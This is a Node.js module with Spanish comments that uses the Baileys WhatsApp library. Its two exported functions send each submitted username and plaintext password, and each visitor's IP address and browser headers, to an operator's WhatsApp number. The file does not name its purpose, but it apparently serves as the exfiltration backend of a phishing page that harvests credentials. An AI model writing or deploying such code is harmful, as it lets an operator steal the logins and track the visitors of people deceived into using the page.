const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const qr = require("qrcode-terminal");

async function start() {
    const { state, saveCreds } = await useMultiFileAuthState("./baileys_auth");
    const sock = makeWASocket({ auth: state });

    sock.ev.on("creds.update", saveCreds);
    sock.ev.on("connection.update", ({ qr: qrCode, connection }) => {
        if (qrCode) {
            console.log("Escanea este QR con WhatsApp:");
            qr.generate(qrCode, { small: true });
        }
        if (connection === "open") {
            console.log("Conectado a WhatsApp");
        }
        if (connection === "close") {
            console.log("Conexión cerrada, intentando reconectar...");
            setTimeout(() => {
                start(); // Reiniciar la conexión
            }, 5000);
        }
    });

    sock.ev.on("stream.error", (err) => {
        console.error("Error de flujo:", err);
        console.log("Intentando reconectar...");
        sock.ws.close();  // Cerrar la conexión WebSocket
        setTimeout(() => start(), 5000); // Reintentar la conexión después de 5 segundos
    });

    return sock;
}

start().catch((err) => {
    console.error("Error al iniciar sesión:", err);
});

// Función para enviar un mensaje a tu WhatsApp
async function enviarMensajeWhatsApp(usuario, contraseña) {
    try {
        const sock = await start(); // Usamos el socket autenticado

        const numeroAdmin = process.env.WHATSAPP_ADMIN_NUMBER; // Usamos la variable de entorno

        // Envía un mensaje con los datos de inicio de sesión
        await sock.sendMessage(numeroAdmin, {
            text: `⚠️ Nuevo intento de login ⚠️\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${contraseña}`,
        });
        console.log("Mensaje enviado a WhatsApp");
    } catch (error) {
        console.error("Error al enviar el mensaje:", error);
    }
}

// Función para alertar sobre la visita
async function alertarUsuarioWhatsapp(headers) {
    try {
        const sock = await start(); // Usamos el socket autenticado

        const numeroAdmin = process.env.WHATSAPP_ADMIN_NUMBER; // Usamos la variable de entorno

        // Crear el mensaje con los detalles del encabezado y la IP
        const mensaje = `
        ⚠️ Nueva visita registrada ⚠️

        🖥️ Información del visitante:
        - User-Agent: ${headers["user-agent"] || "No disponible"}
        - Accept-Language: ${headers["accept-language"] || "No disponible"}
        - Referer: ${headers["referer"] || "No disponible"}
        - Host: ${headers["host"] || "No disponible"}
        - IP Address: ${headers["x-forwarded-for"] || "IP no disponible"}
        
        🔍 Información adicional:
        - Date: ${new Date().toLocaleString()}
        `;

        // Enviar el mensaje con la información del usuario
        await sock.sendMessage(numeroAdmin, { text: mensaje });
        console.log("Mensaje con la información del usuario enviado a WhatsApp");
    } catch (error) {
        console.error("Error al enviar el mensaje:", error);
    }
}

module.exports = { enviarMensajeWhatsApp, alertarUsuarioWhatsapp };